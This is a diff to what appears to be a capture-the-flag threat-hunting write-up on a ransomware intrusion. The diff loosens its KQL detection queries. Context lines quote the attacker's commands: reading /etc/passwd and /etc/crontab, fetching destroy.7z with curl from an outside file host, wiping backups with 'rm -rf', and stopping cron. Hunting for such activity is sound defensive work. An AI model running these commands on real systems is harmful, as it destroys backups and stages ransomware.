@@ -166,13 +166,11 @@ cat /etc/passwd
 **KQL:**
 ```kql
 DeviceProcessEvents
-| where DeviceName in~ (AzukiDevices)
-| where AccountName == "backup-admin"
-| where ProcessCommandLine == "cat /etc/passwd"
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has "cat /etc"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 ```
-
 ---
 
 ### FLAG 7 – Scheduled Job Reconnaissance
@@ -188,9 +186,8 @@ cat /etc/crontab
 **KQL:**
 ```kql
 DeviceProcessEvents
-| where DeviceName in~ (AzukiDevices)
-| where AccountName == "backup-admin"
-| where ProcessCommandLine == "cat /etc/crontab"
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has "cat /etc"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 ```
@@ -210,14 +207,11 @@ curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
 **KQL:**
 ```kql
 DeviceProcessEvents
-| where DeviceName in~ (AzukiDevices)
-| where AccountName == "backup-admin"
-| where FileName in~ ("curl","wget") or ProcessCommandLine has_any ("curl ","wget ")
-| where ProcessCommandLine has "litter.catbox.moe" and ProcessCommandLine has "destroy.7z"
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has "curl -L"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 ```
-
 ---
 
 ### FLAG 9 – Credential Theft
@@ -257,14 +251,11 @@ rm -rf /backups/archives /backups/azuki-adminpc ...
 **KQL:**
 ```kql
 DeviceProcessEvents
-| where DeviceName in~ (AzukiDevices)
-| where AccountName == "backup-admin"
-| where FileName in~ ("rm","bash","sh")
-| where ProcessCommandLine startswith "rm -rf /backups/"
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has "rm -rf /backups" 
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 ```
-
 ---
 
 ### FLAG 11 – Backup Service Stopped
@@ -280,9 +271,8 @@ systemctl stop cron
 **KQL:**
 ```kql
 DeviceProcessEvents
-| where DeviceName in~ (AzukiDevices)
-| where AccountName == "backup-admin"
-| where ProcessCommandLine == "systemctl stop cron"
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has "systemctl stop"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 ```
@@ -302,16 +292,12 @@ systemctl disable cron
 **KQL:**
 ```kql
 DeviceProcessEvents
-| where DeviceName in~ (AzukiDevices)
-| where AccountName == "backup-admin"
-| where ProcessCommandLine == "systemctl disable cron"
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has "systemctl disable"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 ```
-
 ---
-
-## PHASE 2 – Windows Ransomware Deployment (FLAGS 13–15)
 
 ### FLAG 13 – Remote Execution Tool
 **Finding:** PsExec was used for lateral command execution over admin shares.
@@ -628,7 +614,7 @@ SILENTLYNX_README.txt
 **KQL:**
 ```kql
 DeviceFileEvents
-| where DeviceName in~ (AzukiDevices)
+| where DeviceName contains "azuki"
 | where FileName == "SILENTLYNX_README.txt"
 | project TimeGenerated, DeviceName, ActionType, FolderPath, FileName,
           InitiatingProcessFileName, InitiatingProcessCommandLine
